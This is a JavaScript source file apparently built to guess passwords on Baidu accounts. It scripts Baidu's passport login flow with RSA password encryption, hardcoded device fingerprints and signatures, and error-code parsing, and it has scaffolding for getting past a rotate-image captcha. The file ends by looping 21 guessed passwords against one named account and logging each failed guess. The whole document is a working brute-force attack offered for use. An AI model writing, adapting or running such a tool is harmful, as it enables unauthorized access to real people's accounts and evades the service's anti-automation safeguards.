import fetch from 'node-fetch';
import NodeRSA from 'node-rsa';
import { from, of } from 'rxjs';
import { map, switchMap, catchError, delay } from 'rxjs/operators';
import { commonHeaders, ak, fuid, BAIDU_URL } from "./constants.js";
import getCookie from "./getCookie.js";
import getInit from "./getInit.js";
import getToken from "./getToken.js";
import { getGid, getTime, getCallback } from "./utils/index.js";
import Reply from './reply.js';
const gid = getGid()


// step 1 获取到cookie
// setp 2 getInit 获取 s 和 k
class AutoFind {
    cookie
    s
    k
    token
    constructor({ cookie, initS, initK, token }) {
        this.cookie = cookie
        this.s = initS;
        this.k = initK;
        this.token = token;
    }

    async run(username, password) {
        const { as, tk, ds } = await this.getViewLog()
        const reply = new Reply(this.cookie, tk, as)
        console.log('run start !!!')
        from(this.fetchPublicKey(this.token, gid)).pipe(
            map(({ publicKey, key, traceid }) => {
                this.traceid = traceid
                const encryptedPassword = this.encryptPassword(password, publicKey);
                return { encryptedPassword, key };
            }),
            catchError((error) => {
                console.log('出错！request:', error);
                return of({ error });
            }),
            switchMap(async ({ encryptedPassword, key }) => {

                const tt = getTime()
                const data = {
                    staticpage: 'https://www.baidu.com/cache/user/html/v3Jump.html',
                    charset: 'UTF-8',
                    tpl: 'mn',
                    subpro: '',
                    apiver: 'v3',
                    codestring: '',
                    safeflg: '0',
                    u: 'https://www.baidu.com/',
                    isPhone: false,
                    detect: '1',
                    quick_user: '0',
                    logintype: 'dialogLogin',
                    logLoginType: 'pc_loginDialog',
                    idc: '',
                    mkey: '',
                    splogin: 'rate',
                    mem_pass: 'on',
                    isagree: 'on',
                    rsakey: key,
                    crypttype: '12',
                    ppui_logintime: '70218438',
                    countrycode: '',
                    fp_uid: '',
                    fp_info: '',
                    loginversion: 'v5',
                    supportdv: '1',
                    bdint_sync_cookie: '',
                    dv: 'tk0.61983360462070381722055026471@ttk0ynARNZ0mQYDEQZ2kNx0RKy06yl09yy2vlxOvyZo7NQ07NzLk3Q2kqZO6GZOmylAgK~AgFdo7sZ0mQ5t5lu53nAMxjt5xhL07nLMiGgrM8oHExT2k0gAg3iAg3QLkHx2kqZGsnoFx8h7GjL5nAtMgsQMxjxN-Gz7WnXr9yg0gNlAg3youy_nk0oIAkp~2kp-A1yQARqx2nFh73D9t5xLMxh75ndQ0GjL5M8RO-FTFvjiOWQSHEFdoksQ2kslA1yl0gtl2nFh73D9t5xLMxh75ndQ0GjLNiG1OET~LkKz09yz0R0Zo73aA1Q5t5lu53nAMxjt5xhL07nLMiAxHWxIDuyiAR3Z0R5Q2ksQ0Rsx2nFh73D9t5xLMxh75ndQ0GjLNiG1OET~Gi8UNuhTN6yl0g3Z07Nx2kszAgqQ2nFh73D9t5xLMxh75ndQ0GjLrWjzOMy_ImmPxmuzTuIWhuk-0zyz2kszAy__wkjDvZy2RHQo7Kg0gHyAkHz0kNy0gKQAgpz0k5x0kp-AkNQhkjPuF~Nu0V2zjiDiNYHWnIru5YH-jX2zQxOWFTrWTYrEt_Akv0R5Z0myQAkty2kpa0myQAkty2k3y0myQAkty2ks~AkqZoksl',
                    alg: 'v3',
                    elapsed: '2',
                    rinfo: `{"fuid":"e6dff83b0c6ccd098414591296a4bf73"}'`,
                    shaOne: '000af72aedb153fe9a3d31c135903b9068a8e860',
                    traceid: this.traceid,

                    sig: "Y3pYUFRNU2dnQ2syZ2VhaC9mTmNTaytWYTc0RXM0eHFIbFZkRHJwTVRzNHR1aWNEKzVheDV1TFZzYUJ1eHcreQ==",
                    s: this.s,
                    k: this.k,
                    loginmerge: true,
                    gid,
                    username,
                    password: encryptedPassword,
                    tk,
                    fuid,
                    token: token,
                    tt,
                    time: tt.slice(0, -3),
                    ds: ds,
                    tk: tk,
                };
                return data
            }),
            switchMap(async (data) => {
                return fetch('https://passport.baidu.com/v2/api/?login', {
                    method: 'POST',
                    headers: { ...commonHeaders, Cookie: this.cookie },
                    body: new URLSearchParams(data)
                });
            }),
            switchMap((response) => response.text()),
            map((text) => {
                return {
                    success: text.includes('err_no=0') || text.includes('err_no=120021'),
                    // needsCaptcha: text.includes('err_no=257') || text.includes('err_no=6'),
                    isRotateImg: text.includes('err_no=50052'),
                    passwordError: text.includes('err_no=7'),
                    codeString: text.match(/codeString=([^&]+)&/),
                    original: text
                };
            }),
            switchMap((loginResult) => {
                if (loginResult.isRotateImg) {
                    reply.run().subscribe(f2 => {
                        console.log(f2, 'f2')
                        // return this.updateDsAndTk(f2, this.initS, this.initK)
                        // return f2
                    })
                    return of(loginResult);
                } else {
                    return of(loginResult);
                }
            }),
            map((loginResult) => {
                if (!loginResult.success) {
                    return { error: `[${username}] 密码不是：${password}` };
                }
                return loginResult;
            }),
            catchError((error) => {
                console.error('Error in login request:', error);
                return of({ error });
            })
        ).subscribe(response => {
            console.log(response);
        });
    }
    async fetchPublicKey(token, gid) {
        const tt = getTime();
        const params = {
            token,
            tpl: 'mn',
            subpro: '',
            apiver: 'v3',
            loginversion: "v5",
            tt,
            time: tt.slice(0, -3),
            sig: '',
            gid,
            traceid: this.traceid ?? '',
        };
        const response = await fetch(`https://passport.baidu.com/v2/getpublickey?${new URLSearchParams(params).toString()}`, { headers: { ...commonHeaders, Cookie: this.cookie }, })
        const text = await response.text()
        const jdata = JSON.parse(text.replace(/'/g, '"'));
        return {
            publicKey: jdata.pubkey,
            key: jdata.key,
            traceid: jdata.traceid
        };
    };
    // 加密密码
    encryptPassword(password, publicKey) {
        // 创建NodeRSA实例并导入公钥
        const key = new NodeRSA(publicKey, 'pkcs8-public', {
            encryptionScheme: 'pkcs1'
        });

        // 使用公钥加密密码并进行Base64编码
        const encryptedPassword = key.encrypt(password, 'base64');
        return encryptedPassword;
    };
    async getViewLog() {
        const t = getTime()
        const url = `https://passport.baidu.com/viewlog?ak=${ak}&callback=${getCallback()}&v=${Math.floor(10000 * Math.random() + 500)}&_=${t}`;
        const response = await fetch(url, { headers: { ...commonHeaders, Cookie: this.cookie } });
        const text = await response.text();
        const json = JSON.parse(text.match(/\((.*)\)/)[1]);
        return json.data;
    };
    // updateDsAndTk
    updateDsAndTk(f2, as, tk) {
        const url = "https://wappass.baidu.com/cap/log";

        const data = {
            "_": getTime(),
            "refer": BAIDU_URL,
            ak,
            as,
            "scene": "",
            tk,
            "ver": "2",
            "cv": "submit",
            "typeid": "spin-0",
            fuid,
            "fs": f2
        };

        const headers = { ...commonHeaders, Cookie: this.cookie };

        fetch(url, {
            method: 'POST',
            headers: headers,
            body: new URLSearchParams(data),
            credentials: 'include'
        })
            .then(response => response.json())
            .then(json => {
                const op = json.data.op;
                console.log('op=>', op);
                // 3 验证失败，
                // 1 验证成功
            })
            .catch(error => console.error('Error:', error));
    }
}

const cookie = await getCookie();

const { s, k } = await getInit();
const token = await getToken(gid);

const autoFind = new AutoFind({ cookie, initS: s, initK: k, token })

// const username = '不腻';
// const password = '13156626720';

//生成 8-14位数的随机密码
function generateRandomPassword() { return Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15); }

const array = [...Array.from({ length: 20 }).map(() => ({
    username: "天平地成",
    password: generateRandomPassword()
})), {
    username: "天平地成",
    password: "021014"
}]

for (const { username, password } of array) {
    const res = await autoFind.run(username, password)
}